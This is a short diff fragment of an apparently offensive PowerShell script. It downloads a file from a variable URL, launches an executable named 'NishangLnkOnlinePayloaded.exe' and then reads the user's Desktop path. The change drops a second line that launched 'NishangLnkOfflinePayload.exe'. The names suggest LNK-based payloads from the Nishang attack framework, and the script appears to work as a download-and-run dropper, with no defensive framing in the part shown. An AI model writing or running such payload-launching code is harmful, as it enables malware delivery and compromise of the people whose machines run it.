@@ -9,6 +9,5 @@ wget $url -outfile $output
 Write-Output "Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)"
 
 Start-Process -FilePath "NishangLnkOnlinePayloaded.exe"
-Start-Process -FilePath "NishangLnkOfflinePayload.exe"
 
 $DesktopPath = [Environment]::GetFolderPath('Desktop');
